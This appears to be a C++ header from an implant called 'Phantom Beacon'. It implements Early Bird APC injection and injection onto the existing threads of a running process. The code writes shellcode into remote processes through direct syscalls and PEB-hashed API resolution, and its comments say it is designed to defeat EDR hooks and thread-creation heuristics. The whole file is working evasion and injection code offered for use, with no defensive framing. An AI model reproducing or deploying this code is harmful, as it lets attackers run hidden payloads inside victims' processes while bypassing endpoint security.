#pragma once
// ============================================================================
//  apc_injection.h — Phantom Beacon APC Injection (Early Bird + Threadless)
//  ──────────────────────────────────────────────────────────────────────
//  Two stealthy injection techniques that avoid NtCreateThreadEx entirely,
//  defeating EDRs that hook remote-thread creation:
//
//  EARLY BIRD (early_bird_apc):
//    CreateProcess(SUSPENDED) → allocate → write shellcode → QueueUserAPC
//    on the suspended main thread → ResumeThread. The shellcode runs as an
//    APC *before* the process's real entry point (ntdll!LdrInitializeThunk).
//    No remote thread is ever created — the APC is the very first code that
//    runs in the new process.
//
//  THREADLESS (threadless_apc):
//    QueueUserAPC onto an *existing* thread in a running process (e.g. all
//    threads of a browser). The shellcode runs in the context of a thread
//    that was already there — no new thread appears in the process tree.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include "syscalls.h"
#include "evasion.h"

namespace apc {

// ── PEB-resolved API hashes ────────────────────────────────────────────────
constexpr uint32_t FN_QUEUEUSERAPC      = 0x0CAB295B;  // QueueUserAPC
constexpr uint32_t FN_RESUMETHREAD      = 0x0A008F0C;  // ResumeThread
constexpr uint32_t FN_THREAD32FIRST     = 0xE63B92A8;  // Thread32First
constexpr uint32_t FN_THREAD32NEXT      = 0xFF3C6E7F;  // Thread32Next
constexpr uint32_t FN_CREATETOOLHELP32SNAPSHOT = 0x47CD5433; // CreateToolhelp32Snapshot
constexpr uint32_t FN_OPENTHREAD        = 0x58995CAD;  // OpenThread

typedef DWORD (WINAPI *PFN_QueueUserAPC)(
    PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
typedef DWORD (WINAPI *PFN_ResumeThread)(HANDLE hThread);
typedef BOOL (WINAPI *PFN_Thread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL (WINAPI *PFN_Thread32Next)(HANDLE, LPTHREADENTRY32);
typedef HANDLE (WINAPI *PFN_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef HANDLE (WINAPI *PFN_OpenThread)(DWORD, BOOL, DWORD);

/// Early Bird APC injection: shellcode runs before the process's entry point.
inline bool early_bird_apc(
    const std::wstring& exePath,
    const std::vector<unsigned char>& shellcode)
{
    // 1. Create the target process suspended
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(exePath.c_str(), nullptr, nullptr, nullptr,
                        FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi))
        return false;

    // 2. Allocate memory in the suspended process
    PVOID pRemote = nullptr;
    SIZE_T size = shellcode.size();
    NTSTATUS st = syscalls::SysNtAllocateVirtualMemoryDirect(
        pi.hProcess, &pRemote, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0) {
        syscalls::SysNtClose(pi.hThread);
        syscalls::SysNtClose(pi.hProcess);
        return false;
    }

    // 3. Write shellcode
    st = syscalls::SysNtWriteVirtualMemoryDirect(
        pi.hProcess, pRemote, (PVOID)shellcode.data(), shellcode.size(), nullptr);
    if (st != 0) {
        syscalls::SysNtClose(pi.hThread);
        syscalls::SysNtClose(pi.hProcess);
        return false;
    }

    // 4. Change protection to RX (RWX hardening — never execute from RW)
    DWORD oldProtect;
    SIZE_T protectSize = shellcode.size();
    PVOID protectAddr = pRemote;
    syscalls::SysNtProtectVirtualMemoryDirect(
        pi.hProcess, &protectAddr, &protectSize, PAGE_EXECUTE_READ, &oldProtect);

    // 5. Queue the shellcode as an APC on the suspended main thread
    auto pQueueAPC = (PFN_QueueUserAPC)
        peb::Resolve(peb::HASH_KERNEL32, FN_QUEUEUSERAPC);
    if (!pQueueAPC) {
        syscalls::SysNtClose(pi.hThread);
        syscalls::SysNtClose(pi.hProcess);
        return false;
    }

    // PAPCFUNC is the shellcode address cast to a function pointer
    DWORD queued = pQueueAPC(
        reinterpret_cast<PAPCFUNC>(pRemote),
        pi.hThread,
        0);

    if (queued == 0) {
        syscalls::SysNtClose(pi.hThread);
        syscalls::SysNtClose(pi.hProcess);
        return false;
    }

    // 6. Resume the main thread → APC executes before LdrInitializeThunk
    auto pResume = (PFN_ResumeThread)
        peb::Resolve(peb::HASH_KERNEL32, FN_RESUMETHREAD);
    if (pResume) pResume(pi.hThread);

    syscalls::SysNtClose(pi.hThread);
    syscalls::SysNtClose(pi.hProcess);
    return true;
}

/// Enumerate all thread IDs in a process.
inline std::vector<DWORD> enum_thread_ids(DWORD pid) {
    std::vector<DWORD> tids;

    auto pSnapshot = (PFN_CreateToolhelp32Snapshot)
        peb::Resolve(peb::HASH_KERNEL32, FN_CREATETOOLHELP32SNAPSHOT);
    auto pFirst = (PFN_Thread32First)
        peb::Resolve(peb::HASH_KERNEL32, FN_THREAD32FIRST);
    auto pNext = (PFN_Thread32Next)
        peb::Resolve(peb::HASH_KERNEL32, FN_THREAD32NEXT);

    if (!pSnapshot || !pFirst || !pNext) return tids;

    HANDLE hSnap = pSnapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return tids;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (pFirst(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid)
                tids.push_back(te.th32ThreadID);
        } while (pNext(hSnap, &te));
    }

    // CloseHandle via PEB (avoid IAT)
    auto pClose = (BOOL(WINAPI*)(HANDLE))
        peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);
    if (pClose) pClose(hSnap);
    return tids;
}

/// Threadless APC injection: queue shellcode onto existing threads.
/// No new thread is created — the shellcode runs in a thread that already
/// exists in the target process. This defeats "CreateRemoteThread" hooks
/// and thread-count heuristics.
inline bool threadless_apc(
    DWORD pid,
    const std::vector<unsigned char>& shellcode)
{
    // 1. Open the target process
    HANDLE hProcess = nullptr;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
    // CLIENT_ID layout (UniqueProcess + UniqueThread)
    struct _APC_CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; };
    _APC_CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = nullptr;

    NTSTATUS st = syscalls::SysNtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_QUERY_INFORMATION,
        &oa, &cid);
    if (st != 0 || !hProcess) return false;

    // 2. Allocate shellcode memory
    PVOID pRemote = nullptr;
    SIZE_T size = shellcode.size();
    st = syscalls::SysNtAllocateVirtualMemoryDirect(
        hProcess, &pRemote, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0) { syscalls::SysNtClose(hProcess); return false; }

    // 3. Write shellcode
    st = syscalls::SysNtWriteVirtualMemoryDirect(
        hProcess, pRemote, (PVOID)shellcode.data(), shellcode.size(), nullptr);
    if (st != 0) { syscalls::SysNtClose(hProcess); return false; }

    // 4. RWX hardening: RW → RX
    DWORD oldProtect;
    SIZE_T protectSize = shellcode.size();
    PVOID protectAddr = pRemote;
    syscalls::SysNtProtectVirtualMemoryDirect(
        hProcess, &protectAddr, &protectSize, PAGE_EXECUTE_READ, &oldProtect);

    // 5. Queue APC on ALL threads in the process (maximize execution chance)
    auto pQueueAPC = (PFN_QueueUserAPC)
        peb::Resolve(peb::HASH_KERNEL32, FN_QUEUEUSERAPC);
    auto pOpenThread = (PFN_OpenThread)
        peb::Resolve(peb::HASH_KERNEL32, FN_OPENTHREAD);
    if (!pQueueAPC || !pOpenThread) {
        syscalls::SysNtClose(hProcess);
        return false;
    }

    auto tids = enum_thread_ids(pid);
    bool queuedAny = false;
    for (DWORD tid : tids) {
        HANDLE hThread = pOpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
                                     FALSE, tid);
        if (!hThread) continue;
        DWORD queued = pQueueAPC(
            reinterpret_cast<PAPCFUNC>(pRemote), hThread, 0);
        if (queued) queuedAny = true;

        // Close thread handle via PEB
        auto pClose = (BOOL(WINAPI*)(HANDLE))
            peb::Resolve(peb::HASH_KERNEL32, FN_CLOSEHANDLE);
        if (pClose) pClose(hThread);
    }

    syscalls::SysNtClose(hProcess);
    return queuedAny;
}

}  // namespace apc
#endif
